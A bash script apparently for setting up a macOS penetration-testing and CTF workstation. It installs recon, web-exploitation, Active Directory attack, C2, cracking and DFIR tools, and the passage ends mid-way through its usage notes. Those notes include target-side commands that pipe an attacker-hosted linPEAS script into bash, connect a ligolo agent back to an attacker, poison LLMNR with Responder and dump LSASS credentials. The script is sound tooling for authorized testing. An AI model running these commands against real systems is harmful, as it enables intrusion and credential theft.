#!/usr/bin/env bash
set -Eeuo pipefail

############################################
# mac-cyber-bootstrap.sh
# Full macOS bootstrap for cybersecurity / CTF / bug bounty
# For authorized testing, labs, and CTFs only.
#
# Author : srhoe (https://github.com/srhoe)
# Repo   : https://github.com/srhoe/mac-cyber-bootstrap
#
# Categories:
#   - Core / Terminal Tooling
#   - Recon / OSINT / Bug Bounty
#   - Web Application Testing
#   - Network / Protocol Analysis
#   - Credential / Password Attacks
#   - Active Directory / Windows / SMB
#   - Red Team / C2 / Post-Exploitation
#   - Reverse Engineering / Binary Exploitation
#   - Blue Team / DFIR / Malware Analysis
#   - Cloud Security (AWS / Azure / GCP)
#   - Wireless / Hardware
#   - GUI Applications
#   - Python (pipx) Tools
#   - Rust (cargo) Tools
#   - Go Tools
#   - Repos / Wordlists
############################################

### ---------- helpers ----------
log()   { printf "\n[+] %s\n" "$*"; }
warn()  { printf "\n[!] %s\n" "$*" >&2; }
ok()    { printf "[✓] %s\n" "$*"; }
fail()  { printf "\n[x] %s\n" "$*" >&2; exit 1; }

trap 'warn "An unexpected error happened on line $LINENO. Review the output above."' ERR

### ---------- preflight ----------
require_macos() {
  [[ "$(uname -s)" == "Darwin" ]] || fail "This script is for macOS only."
}

install_xcode_clt() {
  if xcode-select -p >/dev/null 2>&1; then
    ok "Xcode Command Line Tools already installed."
    return
  fi
  log "Installing Xcode Command Line Tools..."
  xcode-select --install || true
  warn "If a popup appeared, complete it. This script will wait."
  until xcode-select -p >/dev/null 2>&1; do
    sleep 10
    printf "."
  done
  echo
  ok "Xcode Command Line Tools installed."
}

install_homebrew() {
  if command -v brew >/dev/null 2>&1; then
    ok "Homebrew already installed."
  else
    log "Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
  fi
  if [[ -x /opt/homebrew/bin/brew ]]; then
    eval "$(/opt/homebrew/bin/brew shellenv)"
  elif [[ -x /usr/local/bin/brew ]]; then
    eval "$(/usr/local/bin/brew shellenv)"
  else
    fail "brew installed but not found in expected locations."
  fi
}

ensure_shell_profile() {
  local profile_file brew_line path_line
  if [[ "${SHELL:-}" == */zsh ]]; then
    profile_file="$HOME/.zprofile"
  else
    profile_file="$HOME/.bash_profile"
  fi
  if [[ -x /opt/homebrew/bin/brew ]]; then
    brew_line='eval "$(/opt/homebrew/bin/brew shellenv)"'
  else
    brew_line='eval "$(/usr/local/bin/brew shellenv)"'
  fi
  path_line='export PATH="$HOME/.local/bin:$HOME/go/bin:$HOME/.cargo/bin:$PATH"'
  touch "$profile_file"
  grep -Fq "$brew_line" "$profile_file" || echo "$brew_line" >> "$profile_file"
  grep -Fq "$path_line" "$profile_file" || echo "$path_line" >> "$profile_file"
  ok "Shell profile updated: $profile_file"
}

### ---------- dirs ----------
create_dirs() {
  log "Creating workspace directories..."
  mkdir -p "$HOME/tools"
  mkdir -p "$HOME/labs"
  mkdir -p "$HOME/wordlists"
  mkdir -p "$HOME/screenshots"
  mkdir -p "$HOME/reports"
  mkdir -p "$HOME/malware-samples"
  mkdir -p "$HOME/memory-dumps"
  mkdir -p "$HOME/pcaps"
  mkdir -p "$HOME/.local/bin"
  mkdir -p "$HOME/go/bin"
  mkdir -p "$HOME/.gf"
  ok "Directories created."
}

### ---------- brew helpers ----------

# FIX (issue reported by HappyG): guard with `brew list` BEFORE any brew
# invocation so no metadata fetch/download occurs for installed packages.
is_formula_installed() { brew list --formula "$1" >/dev/null 2>&1; }
is_cask_installed()    { brew list --cask    "$1" >/dev/null 2>&1; }

brew_taps() {
  log "Adding Homebrew taps..."
  brew tap sidaf/homebrew-pentest || true
  ok "Taps ready."
}

brew_update_upgrade() {
  log "Updating Homebrew..."
  brew update
  brew upgrade || true
}

### ---------- formulae ----------
install_formulae() {
  log "Installing CLI formulae..."

  local formulae=(

    # -----------------------------------------------
    # CORE / TERMINAL
    # -----------------------------------------------
    git wget curl jq yq
    ripgrep fd bat tree tmux fzf
    coreutils moreutils gnu-sed grep gawk findutils
    watch htop btop ncdu rename
    unzip zip p7zip
    sqlite openssl@3 gnupg
    direnv stow zsh-completions
    asciinema        # record terminal sessions for write-ups / content
    glow             # render markdown in terminal
    lolcat figlet    # terminal aesthetics / banners

    # -----------------------------------------------
    # RUNTIMES
    # -----------------------------------------------
    python pipx go node ruby rustup openjdk

    # -----------------------------------------------
    # EDITORS / DB / MISC
    # -----------------------------------------------
    neovim mysql netcat socat tcpdump libpcap
    tshark           # CLI Wireshark — scriptable PCAP parsing

    # -----------------------------------------------
    # RECON / OSINT / SUBDOMAIN ENUMERATION
    # -----------------------------------------------
    nmap masscan
    amass subfinder httpx nuclei naabu dnsx
    gobuster feroxbuster ffuf wfuzz
    theharvester recon-ng
    wafw00f nikto
    whois inetutils
    dnsrecon         # DNS zone transfer, brute force, reverse lookup
    fierce           # DNS recon / subdomain brute forcing
    shodan           # Shodan CLI
    exiftool         # deep file metadata extraction
    metagoofil       # metadata from public documents
    osquery          # live endpoint forensics and querying

    # -----------------------------------------------
    # WEB APPLICATION TESTING
    # -----------------------------------------------
    sqlmap           # automated SQL injection
    zaproxy          # OWASP ZAP web app scanner

    # -----------------------------------------------
    # NETWORK / PROTOCOL ANALYSIS
    # -----------------------------------------------
    mtr              # traceroute + ping combined
    testssl          # TLS/SSL cipher assessment
    sslscan          # quick SSL version/cipher scanner
    proxychains-ng   # route traffic through SOCKS/HTTP proxies
    bettercap        # network attack, MITM, wireless recon
    iperf3 telnet

    # -----------------------------------------------
    # CREDENTIAL / PASSWORD ATTACKS
    # -----------------------------------------------
    hydra            # online password brute force
    john-jumbo       # John the Ripper community build
    hashcat          # GPU-accelerated password cracking
    hcxtools         # WPA/PCAP hash conversion for hashcat
    hcxdumptool      # capture WiFi handshakes
    bitwarden-cli    # password manager CLI

    # -----------------------------------------------
    # ACTIVE DIRECTORY / WINDOWS / SMB
    # -----------------------------------------------
    impacket         # Windows protocol suite (SMB, Kerberos, NTLM, DCOM)
    evil-winrm       # WinRM shell for pentesting
    kerbrute         # Kerberos username enum and password spray
    azurehound       # Azure/AAD BloodHound data collector
    smbmap           # SMB share enumeration
    samba            # smbclient on macOS
    openldap         # LDAP client tools (ldapsearch, ldapadd)
    enum4linux-ng    # SMB/LDAP enumeration rewrite

    # -----------------------------------------------
    # EXPLOITATION FRAMEWORKS
    # -----------------------------------------------
    metasploit       # industry-standard exploitation framework
    exploitdb        # searchsploit / local exploit-db

    # -----------------------------------------------
    # RED TEAM / PIVOTING / TUNNELING
    # -----------------------------------------------
    chisel           # TCP tunneling over HTTP for pivoting

    # -----------------------------------------------
    # REVERSE ENGINEERING / BINARY ANALYSIS
    # -----------------------------------------------
    radare2          # RE framework — disassembly, debugging, scripting
    binwalk          # firmware/binary analysis and extraction
    capstone         # disassembly engine library
    unicorn          # CPU emulator framework
    keystone-engine  # assembler framework
    yara             # pattern matching for malware identification
    foremost         # file carving / recovery

    # -----------------------------------------------
    # BLUE TEAM / DFIR / NETWORK DEFENSE
    # -----------------------------------------------
    zeek             # network traffic analysis / NSM framework
    suricata         # IDS/IPS with rule-based detection

    # -----------------------------------------------
    # CLOUD SECURITY
    # -----------------------------------------------
    awscli           # AWS CLI — cloud pentesting, SSRF validation
    azure-cli        # Azure CLI — pairs with AzureHound
    terraform        # IaC analysis and lab spins
    trufflehog       # secret scanning across git history
    gitleaks         # detect hardcoded secrets in repos

    # -----------------------------------------------
    # WIRELESS
    # -----------------------------------------------
    aircrack-ng      # WiFi security auditing suite

    # -----------------------------------------------
    # UTILITY / WORKFLOW
    # -----------------------------------------------
    semgrep          # static analysis / SAST
    gron             # make JSON greppable
    httpie           # human-friendly curl alternative
    xh               # fast Rust-based HTTP client
    dasel            # query/modify JSON, YAML, TOML, CSV
    gemini-cli       # Google Gemini CLI
  )

  for pkg in "${formulae[@]}"; do
    if is_formula_installed "$pkg"; then
      ok "$pkg already installed (skipping download)"
    else
      printf "  - installing formula: %s\n" "$pkg"
      brew install "$pkg" || warn "Failed to install formula: $pkg"
    fi
  done

  # Tapped formulae
  local tapped_formulae=(
    sidaf/homebrew-pentest/crackmapexec
  )
  for pkg in "${tapped_formulae[@]}"; do
    if is_formula_installed "$pkg"; then
      ok "$pkg already installed (skipping download)"
    else
      printf "  - installing tapped formula: %s\n" "$pkg"
      brew install "$pkg" || warn "Failed to install tapped formula: $pkg"
    fi
  done
}

### ---------- casks ----------
install_casks() {
  log "Installing GUI apps / casks..."

  local casks=(
    # Browsers / Privacy
    firefox tor-browser mullvad-vpn

    # Comms / Productivity
    discord signal telegram obsidian libreoffice
    visual-studio-code iterm2

    # Security GUI
    wireshark-app    # GUI Wireshark + tshark
    burp-suite       # web app intercepting proxy
    caido            # modern Burp alternative
    proxyman         # native macOS HTTP/HTTPS proxy debugger
    bloodhound       # AD attack path visualization
    maltego          # OSINT / link analysis
    cutter           # Rizin/Radare2 GUI for reverse engineering
    ghidra           # NSA reverse engineering suite (free IDA alternative)

    # Cloud / Infra
    docker           # containers for lab environments
    cyberduck        # S3 / cloud storage browser
    gas-mask         # /etc/hosts profile switcher (lab target routing)

    # Security / Privacy Utilities
    bitwarden        # password manager GUI
    secretive        # SSH keys in Secure Enclave (T2/M-series)
    apparency        # inspect app code signatures and entitlements
  )

  for cask in "${casks[@]}"; do
    if is_cask_installed "$cask"; then
      ok "$cask already installed (skipping download)"
    else
      printf "  - installing cask: %s\n" "$cask"
      brew install --cask "$cask" || warn "Failed to install cask: $cask"
    fi
  done
}

### ---------- pipx (Python tools) ----------
setup_pipx() {
  log "Setting up pipx Python tools..."
  pipx ensurepath || true

  local pipx_apps=(
    # Web / Bug Bounty
    dirsearch        # web path brute forcing
    paramspider      # mine URLs for parameters from web archives
    mitmproxy        # HTTPS MITM proxy
    jwt_tool         # JWT attack and analysis toolkit
    tplmap           # server-side template injection (SSTI) exploiter
    commix           # command injection automated exploiter
    arjun            # HTTP parameter discovery (finds hidden params)
    corscanner       # CORS misconfiguration scanner
    smuggler         # HTTP request smuggling detector

    # Active Directory / Windows
    impacket         # Windows protocol suite — SMB, Kerberos, NTLM
    bloodhound-python # BloodHound data collector from Linux/macOS
    certipy-ad       # AD Certificate Services abuse (ESC1-ESC8)
    crackmapexec     # network pentesting multi-tool
    netexec          # actively maintained CrackMapExec fork
    pypykatz         # Mimikatz reimplemented in pure Python
    ldapdomaindump   # dump AD info over LDAP
    pywhisker        # shadow credentials / AD CS abuse
    coercer          # coerce Windows hosts to authenticate
    enum4linux       # classic SMB enumeration script

    # Red Team / Exploitation
    pwntools         # CTF binary exploitation framework

    # Cloud Security
    pacu             # AWS exploitation framework
    scoutsuite       # multi-cloud security auditing (AWS/Azure/GCP)
    s3scanner        # find open/misconfigured S3 buckets

    # Blue Team / DFIR / Malware Analysis
    volatility3      # memory forensics — analyze RAM dumps
    oletools         # analyze Office macros and OLE documents
    pdfid            # detect malicious PDF indicators
    floss            # advanced string extraction from binaries
    yara-python      # YARA Python bindings

    # Utility
    cython           # compile Python to C (useful in CTF reversing)
  )

  for app in "${pipx_apps[@]}"; do
    if pipx list 2>/dev/null | grep -q "$app"; then
      ok "$app already installed with pipx"
    else
      printf "  - pipx installing: %s\n" "$app"
      pipx install "$app" || warn "pipx install failed: $app"
    fi
  done
}

### ---------- Rust / cargo ----------
setup_rust() {
  log "Initializing Rust toolchain..."
  export PATH="$(brew --prefix rustup)/bin:$PATH"
  rustup default stable || true
  export PATH="$HOME/.cargo/bin:$PATH"

  log "Installing Rust-based security tools..."
  local cargo_tools=(
    rustscan         # fast full-port scanner; hands off to nmap
    feroxbuster      # fast recursive content discovery
    chainsaw         # fast Windows event log threat hunting (DFIR)
  )

  for tool in "${cargo_tools[@]}"; do
    if cargo install --list 2>/dev/null | grep -q "^$tool "; then
      ok "$tool already installed via cargo"
    else
      printf "  - cargo installing: %s\n" "$tool"
      cargo install "$tool" || warn "cargo install failed: $tool"
    fi
  done

  ok "Rust toolchain ready."
}

### ---------- Go tools ----------
setup_go_tools() {
  log "Installing Go-based tools..."
  export PATH="$HOME/go/bin:$PATH"

  local go_tools=(
    # tomnomnom suite
    github.com/tomnomnom/waybackurls@latest
    github.com/tomnomnom/assetfinder@latest
    github.com/tomnomnom/httprobe@latest
    github.com/tomnomnom/anew@latest
    github.com/tomnomnom/unfurl@latest
    github.com/tomnomnom/qsreplace@latest
    github.com/tomnomnom/gf@latest
    github.com/tomnomnom/meg@latest
    github.com/tomnomnom/concurl@latest

    # projectdiscovery suite
    github.com/projectdiscovery/katana/cmd/katana@latest
    github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest
    github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest
    github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
    github.com/projectdiscovery/notify/cmd/notify@latest
    github.com/projectdiscovery/tlsx/cmd/tlsx@latest
    github.com/projectdiscovery/asnmap/cmd/asnmap@latest
    github.com/projectdiscovery/uncover/cmd/uncover@latest
    github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest
    github.com/projectdiscovery/dnsx/cmd/dnsx@latest
    github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
    github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

    # web / bug bounty
    github.com/hakluke/hakrawler@latest
    github.com/lc/gau/v2/cmd/gau@latest
    github.com/OJ/gobuster/v3@latest
    github.com/hahwul/dalfox/v2@latest        # XSS parameter scanner
    github.com/dwisiswant0/crlfuzz@latest      # CRLF injection fuzzer
    github.com/ethicalhackingplayground/bxss@latest  # blind XSS injector
    github.com/003random/getJS@latest          # extract JS URLs from page
    github.com/KathanP19/Jsmon@latest          # JS file change monitoring
    github.com/d3mondev/puredns/v2@latest      # fast subdomain brute-forcer
    github.com/sw33tLie/sns@latest             # SNI sniffing — find vhosts
    github.com/Emoe/kxss@latest               # XSS parameter finder
    github.com/ffuf/ffuf/v2@latest             # fast web fuzzer

    # active directory / windows
    github.com/ropnop/windapsearch@latest      # LDAP enumeration
    github.com/ropnop/kerbrute@latest          # Kerberos brute force / spray

    # red team / pivoting / tunneling
    github.com/nicocha30/ligolo-ng/cmd/proxy@latest   # ligolo-ng proxy
    github.com/nicocha30/ligolo-ng/cmd/agent@latest   # ligolo-ng agent
    github.com/jpillora/chisel@latest                  # TCP tunnel over HTTP

    # cloud security
    github.com/BishopFox/cloudfox@latest       # cloud pentesting enumeration

    # blue team / DFIR
    github.com/Yamato-Security/hayabusa@latest # Windows event log forensics

    # misc
    github.com/RedTeamPentesting/pretender@latest  # LLMNR/NBNS/mDNS spoofer
  )

  for tool in "${go_tools[@]}"; do
    printf "  - go install %s\n" "$tool"
    go install "$tool" || warn "Go install failed: $tool"
  done
}

### ---------- Manual installs ----------
install_manual_tools() {
  log "Installing tools requiring manual/scripted install..."

  # Sliver C2 — open-source adversary emulation (macOS supported)
  if command -v sliver >/dev/null 2>&1 || [[ -f /usr/local/bin/sliver ]]; then
    ok "Sliver C2 already installed"
  else
    log "Installing Sliver C2 framework..."
    curl https://sliver.sh/install | sudo bash || \
      warn "Sliver install failed — install manually: https://github.com/BishopFox/sliver"
  fi

  # pwndbg — GDB enhancement for binary exploitation / pwn CTFs
  if [[ -d "$HOME/tools/pwndbg" ]]; then
    ok "pwndbg already cloned"
    if ! grep -q "pwndbg" "$HOME/.gdbinit" 2>/dev/null; then
      cd "$HOME/tools/pwndbg" && ./setup.sh || warn "pwndbg setup.sh failed"
      cd "$HOME"
    fi
  else
    log "Cloning and installing pwndbg..."
    git clone --depth=1 https://github.com/pwndbg/pwndbg "$HOME/tools/pwndbg" && \
      cd "$HOME/tools/pwndbg" && ./setup.sh || \
      warn "pwndbg install failed — run $HOME/tools/pwndbg/setup.sh manually"
    cd "$HOME"
  fi

  # ROPgadget — ROP chain finder
  if command -v ROPgadget >/dev/null 2>&1; then
    ok "ROPgadget already installed"
  else
    pip3 install ROPgadget || warn "ROPgadget pip install failed"
  fi

  ok "Manual tool installs complete."
}

### ---------- gf patterns ----------
setup_gf_patterns() {
  log "Setting up gf patterns..."
  mkdir -p "$HOME/.gf"
  if [[ -d "$HOME/tools/Gf-Patterns" ]]; then
    cp "$HOME/tools/Gf-Patterns/"*.json "$HOME/.gf/" 2>/dev/null || true
    ok "gf patterns installed to ~/.gf"
  else
    warn "Gf-Patterns repo not found — run clone_repos first."
  fi
}

### ---------- repos / wordlists ----------
clone_repo_if_missing() {
  local repo_url="$1"
  local target_dir="$2"
  if [[ -d "$target_dir/.git" || -d "$target_dir" ]]; then
    ok "$(basename "$target_dir") already exists"
  else
    git clone --depth=1 "$repo_url" "$target_dir" || warn "Clone failed: $repo_url"
  fi
}

clone_repos() {
  log "Cloning security repos and wordlists..."

  # Wordlists
  clone_repo_if_missing "https://github.com/danielmiessler/SecLists.git"                      "$HOME/wordlists/SecLists"
  clone_repo_if_missing "https://github.com/assetnote/wordlists.git"                          "$HOME/wordlists/assetnote"
  clone_repo_if_missing "https://github.com/Bo0oM/fuzz.txt.git"                               "$HOME/wordlists/fuzz.txt"
  clone_repo_if_missing "https://github.com/danielmiessler/RobotsDisallowed.git"              "$HOME/wordlists/RobotsDisallowed"

  # Payload / Reference
  clone_repo_if_missing "https://github.com/swisskyrepo/PayloadsAllTheThings.git"             "$HOME/tools/PayloadsAllTheThings"
  clone_repo_if_missing "https://github.com/payloadbox/xss-payload-list.git"                  "$HOME/tools/xss-payloads"
  clone_repo_if_missing "https://github.com/payloadbox/sql-injection-payload-list.git"        "$HOME/tools/sqli-payloads"
  clone_repo_if_missing "https://github.com/payloadbox/ssti-payloads.git"                     "$HOME/tools/ssti-payloads"

  # Web / Bug Bounty
  clone_repo_if_missing "https://github.com/s0md3v/XSStrike.git"                              "$HOME/tools/XSStrike"
  clone_repo_if_missing "https://github.com/EnableSecurity/wafw00f.git"                       "$HOME/tools/wafw00f-src"
  clone_repo_if_missing "https://github.com/laramies/theHarvester.git"                        "$HOME/tools/theHarvester-src"
  clone_repo_if_missing "https://github.com/m4ll0k/SecretFinder.git"                         "$HOME/tools/SecretFinder"
  clone_repo_if_missing "https://github.com/GerbenJavado/LinkFinder.git"                     "$HOME/tools/LinkFinder"
  clone_repo_if_missing "https://github.com/s0md3v/Corsy.git"                                "$HOME/tools/Corsy"
  clone_repo_if_missing "https://github.com/defparam/smuggler.git"                            "$HOME/tools/smuggler"

  # Active Directory / Windows
  clone_repo_if_missing "https://github.com/PowerShellMafia/PowerSploit.git"                  "$HOME/tools/PowerSploit"
  clone_repo_if_missing "https://github.com/lgandx/Responder.git"                             "$HOME/tools/Responder"
  clone_repo_if_missing "https://github.com/itm4n/PrivescCheck.git"                           "$HOME/tools/PrivescCheck"
  clone_repo_if_missing "https://github.com/ly4k/Certipy.git"                                 "$HOME/tools/Certipy"
  clone_repo_if_missing "https://github.com/p0dalirius/Coercer.git"                           "$HOME/tools/Coercer"
  clone_repo_if_missing "https://github.com/dirkjanm/BloodHound.py.git"                       "$HOME/tools/BloodHound.py"
  clone_repo_if_missing "https://github.com/dirkjanm/mitm6.git"                               "$HOME/tools/mitm6"
  clone_repo_if_missing "https://github.com/Kevin-Robertson/Inveigh.git"                      "$HOME/tools/Inveigh"

  # Privilege Escalation
  clone_repo_if_missing "https://github.com/carlospolop/PEASS-ng.git"                         "$HOME/tools/PEASS-ng"
  clone_repo_if_missing "https://github.com/rebootuser/LinEnum.git"                           "$HOME/tools/LinEnum"
  clone_repo_if_missing "https://github.com/DominicBreuker/pspy.git"                          "$HOME/tools/pspy"

  # Red Team / Post-Exploitation
  clone_repo_if_missing "https://github.com/Flangvik/SharpCollection.git"                     "$HOME/tools/SharpCollection"

  # Blue Team / DFIR / Malware Analysis
  clone_repo_if_missing "https://github.com/volatilityfoundation/volatility3.git"             "$HOME/tools/volatility3"
  clone_repo_if_missing "https://github.com/SigmaHQ/sigma.git"                               "$HOME/tools/sigma"
  clone_repo_if_missing "https://github.com/Neo23x0/YARA-Rules.git"                          "$HOME/tools/YARA-Rules"
  clone_repo_if_missing "https://github.com/mandiant/capa.git"                                "$HOME/tools/capa"
  clone_repo_if_missing "https://github.com/WithSecureLabs/chainsaw.git"                      "$HOME/tools/chainsaw"
  clone_repo_if_missing "https://github.com/Yamato-Security/hayabusa.git"                     "$HOME/tools/hayabusa"

  # Cloud Security
  clone_repo_if_missing "https://github.com/RhinoSecurityLabs/pacu.git"                       "$HOME/tools/pacu"
  clone_repo_if_missing "https://github.com/nccgroup/ScoutSuite.git"                          "$HOME/tools/ScoutSuite"
  clone_repo_if_missing "https://github.com/BishopFox/cloudfox.git"                          "$HOME/tools/cloudfox"
  clone_repo_if_missing "https://github.com/dirkjanm/ROADtools.git"                          "$HOME/tools/ROADtools"
  clone_repo_if_missing "https://github.com/fox-it/TeamFiltration.git"                       "$HOME/tools/TeamFiltration"
  clone_repo_if_missing "https://github.com/andresriancho/enumerate-iam.git"                 "$HOME/tools/enumerate-iam"

  # Reverse Engineering
  clone_repo_if_missing "https://github.com/pwndbg/pwndbg.git"                               "$HOME/tools/pwndbg"
  clone_repo_if_missing "https://github.com/JonathanSalwan/ROPgadget.git"                    "$HOME/tools/ROPgadget"

  # Automation / Workflow
  clone_repo_if_missing "https://github.com/projectdiscovery/nuclei-templates.git"            "$HOME/tools/nuclei-templates"
  clone_repo_if_missing "https://github.com/projectdiscovery/fuzzing-templates.git"           "$HOME/tools/fuzzing-templates"
  clone_repo_if_missing "https://github.com/1ndianl33t/Gf-Patterns.git"                      "$HOME/tools/Gf-Patterns"
  clone_repo_if_missing "https://github.com/Tib3rius/AutoRecon.git"                           "$HOME/tools/AutoRecon"
  clone_repo_if_missing "https://github.com/21y4d/nmapAutomator.git"                          "$HOME/tools/nmapAutomator"
}

### ---------- aliases / shell config ----------
append_once() {
  local line="$1" file="$2"
  grep -Fq "$line" "$file" || echo "$line" >> "$file"
}

write_shell_config() {
  local rc_file
  if [[ "${SHELL:-}" == */zsh ]]; then
    rc_file="$HOME/.zshrc"
  else
    rc_file="$HOME/.bashrc"
  fi
  touch "$rc_file"
  log "Writing aliases to $rc_file..."

  append_once '' "$rc_file"
  append_once '# =============================================' "$rc_file"
  append_once '# srhoe/mac-cyber-bootstrap — shell config' "$rc_file"
  append_once '# =============================================' "$rc_file"

  # PATH
  append_once 'export PATH="$HOME/.local/bin:$HOME/go/bin:$HOME/.cargo/bin:$PATH"' "$rc_file"
  append_once 'export EDITOR="nvim"' "$rc_file"

  # Wordlist / tool shortcuts
  append_once 'export WORDLISTS="$HOME/wordlists/SecLists"' "$rc_file"
  append_once 'export ASSETNOTE="$HOME/wordlists/assetnote"' "$rc_file"
  append_once 'export PAYLOADS="$HOME/tools/PayloadsAllTheThings"' "$rc_file"
  append_once 'export PEASS="$HOME/tools/PEASS-ng"' "$rc_file"

  # Navigation
  append_once 'alias ll="ls -lah"' "$rc_file"
  append_once 'alias ctf="cd $HOME/labs"' "$rc_file"
  append_once 'alias tools="cd $HOME/tools"' "$rc_file"
  append_once 'alias wordlists="cd $HOME/wordlists"' "$rc_file"
  append_once 'alias reports="cd $HOME/reports"' "$rc_file"
  append_once 'alias dumps="cd $HOME/memory-dumps"' "$rc_file"
  append_once 'alias pcaps="cd $HOME/pcaps"' "$rc_file"

  # Network
  append_once 'alias ports="lsof -i -P -n | grep LISTEN || true"' "$rc_file"
  append_once 'alias myip="curl -4 ifconfig.me && echo"' "$rc_file"
  append_once 'alias myip6="curl -6 ifconfig.me && echo"' "$rc_file"
  append_once 'alias grepip="grep -Eo '\''([0-9]{1,3}\.){3}[0-9]{1,3}'\''"' "$rc_file"
  append_once 'alias listening="lsof -iTCP -sTCP:LISTEN -P -n"' "$rc_file"

  # Web tools
  append_once 'alias pyserver="python3 -m http.server 8000"' "$rc_file"
  append_once 'alias http="http --verify=no"' "$rc_file"

  # Scanning
  append_once 'alias nmapfull="nmap -sC -sV -p- --open"' "$rc_file"
  append_once 'alias nmapquick="nmap -sC -sV --top-ports 1000"' "$rc_file"
  append_once 'alias rustscan="rustscan --ulimit 5000"' "$rc_file"
  append_once 'alias autorecon="python3 $HOME/tools/AutoRecon/autorecon.py"' "$rc_file"
  append_once 'alias nmapauto="$HOME/tools/nmapAutomator/nmapAutomator.sh"' "$rc_file"

  # AD / Windows
  append_once 'alias bloodhound-start="neo4j start && bloodhound &"' "$rc_file"
  append_once 'alias linpeas="bash $HOME/tools/PEASS-ng/linPEAS/linpeas.sh"' "$rc_file"

  # DFIR
  append_once 'alias vol="python3 $HOME/tools/volatility3/vol.py"' "$rc_file"
  append_once 'alias vol3="python3 $HOME/tools/volatility3/vol.py"' "$rc_file"

  # Misc
  append_once 'alias searchsploit="searchsploit"' "$rc_file"
  append_once 'alias reload="source ~/.zshrc 2>/dev/null || source ~/.bashrc"' "$rc_file"

  ok "Shell config updated: $rc_file"
}

### ---------- post-install updates ----------
finalize_tools() {
  log "Running post-install updates..."

  if command -v nuclei >/dev/null 2>&1; then
    nuclei -update-templates || warn "nuclei template update failed"
  fi

  if [[ -d "$HOME/tools/nuclei-templates/.git" ]]; then
    git -C "$HOME/tools/nuclei-templates" pull || true
  fi

  if command -v searchsploit >/dev/null 2>&1; then
    searchsploit -u || warn "searchsploit update failed"
  fi

  # Volatility3 dependencies
  if [[ -d "$HOME/tools/volatility3" ]]; then
    log "Installing volatility3 Python dependencies..."
    pip3 install -r "$HOME/tools/volatility3/requirements.txt" || \
      warn "volatility3 pip requirements failed — run manually"
  fi

  ok "Post-install tasks complete."
}

### ---------- manual notes ----------
manual_notes() {
  cat <<'EOF'

==========================================================
  mac-cyber-bootstrap — by srhoe
  https://github.com/srhoe/mac-cyber-bootstrap
==========================================================

WHAT WAS INSTALLED:

  Core / Terminal         git, tmux, fzf, bat, ripgrep, neovim, asciinema, glow
  Recon / OSINT           nmap, masscan, amass, subfinder, httpx, nuclei, shodan,
                          theharvester, dnsrecon, fierce, exiftool, recon-ng
  Web / Bug Bounty        ffuf, gobuster, feroxbuster, sqlmap, nikto, dalfox,
                          jwt_tool, tplmap, arjun, smuggler, corscanner, zaproxy,
                          XSStrike, LinkFinder, SecretFinder, crlfuzz, bxss
  Network                 Wireshark/tshark, bettercap, mtr, testssl, sslscan,
                          proxychains-ng, mitmproxy, netcat, socat
  Creds / Cracking        hashcat, john-jumbo, hydra, hcxtools, hcxdumptool
  AD / Windows / SMB      impacket, evil-winrm, kerbrute, BloodHound,
                          CrackMapExec, NetExec, certipy-ad, pypykatz,
                          Responder, mitm6, ldapdomaindump, coercer,
                          enum4linux-ng, smbmap, windapsearch
  Red Team / C2           Sliver C2, Metasploit, chisel, ligolo-ng, pwntools,
                          PEASS-ng (LinPEAS/WinPEAS), SharpCollection
  Reverse Engineering     Ghidra, radare2/Cutter, binwalk, pwndbg, ROPgadget,
                          YARA, capstone, unicorn, floss, capa
  Blue Team / DFIR        volatility3, Zeek, Suricata, chainsaw, hayabusa,
                          sigma, YARA-Rules, oletools, pdfid
  Cloud Security          awscli, azure-cli, Pacu, ScoutSuite, CloudFox,
                          ROADtools, TeamFiltration, s3scanner, enumerate-iam
  Wireless                aircrack-ng, hcxdumptool, bettercap
  GUI Apps                Burp Suite, Caido, Wireshark, Ghidra, Cutter,
                          BloodHound, Maltego, Proxyman, Docker, Obsidian

MANUAL / SPECIAL-CASE NOTES:

1. Mimikatz:
   Windows-only binary — keep it in a Windows VM.
   pypykatz is your macOS equivalent for offline credential analysis:
     pypykatz lsa minidump lsass.dmp

2. Sliver C2:
   Start server:  sudo sliver-server
   Connect:       sliver
   Full docs:     https://sliver.sh

3. Havoc C2 (NOT auto-installed — requires manual build):
   Needs Qt5 + Golang — Linux build preferred.
   https://github.com/HavocFramework/Havoc
   Use Sliver as your primary open-source C2 on macOS.

4. Ghidra:
   Requires OpenJDK 21 (installed via brew).
   Launch: open /Applications/Ghidra.app
   Docs:   https://ghidra-sre.org

5. pwndbg:
   GDB enhancement for binary exploitation.
   If setup failed: cd ~/tools/pwndbg && ./setup.sh
   Run: gdb <binary>   (pwndbg loads automatically)

6. Volatility3:
   Usage: vol3 -f memory.dump windows.pslist
          vol3 -f memory.dump linux.bash
   Symbol packs download automatically on first run.
   Docs: https://volatility3.readthedocs.io

7. Zeek + Suricata (Blue Team):
   Both need config for your interface.
   Zeek:     zeek -i en0 <script>
   Suricata: suricata -i en0 -c /opt/homebrew/etc/suricata/suricata.yaml

8. Burp Suite CA Certificate:
   Open Burp → visit http://burpsuite with proxy active
   → Download CA cert → install in macOS Keychain → trust for SSL.
   Proxyman auto-installs its own cert on first launch.

9. RustScan:
   rustscan --ulimit 5000 -a <target> -- -sV -sC
   (alias `rustscan` already sets --ulimit 5000)

10. Shodan CLI:
    shodan init <YOUR_API_KEY>
    shodan host <IP>

11. BloodHound:
    neo4j start
    Open BloodHound app → connect with neo4j creds
    Run: bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c All

12. Ligolo-ng (pivoting):
    Attacker: sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
    Target:   ./ligolo-agent -connect <attacker>:11601 -ignore-cert
    Docs:     https://github.com/nicocha30/ligolo-ng

13. LinPEAS / WinPEAS:
    Located: ~/tools/PEASS-ng/linPEAS/linpeas.sh
    Host:    pyserver  (alias for python3 -m http.server 8000)
    Target:  curl <your-ip>:8000/linpeas.sh | bash

14. Pacu (AWS exploitation):
    pacu
    Docs: https://github.com/RhinoSecurityLabs/pacu

15. Responder (LLMNR/NBNS poisoning):
    Located: ~/tools/Responder/Responder.py
    Run:     sudo python3 ~/tools/Responder/Responder.py -I en0 -wPv

16. Mullvad VPN Kill Switch:
    Enable in Mullvad settings before any recon from public networks.

17. proxychains-ng config:
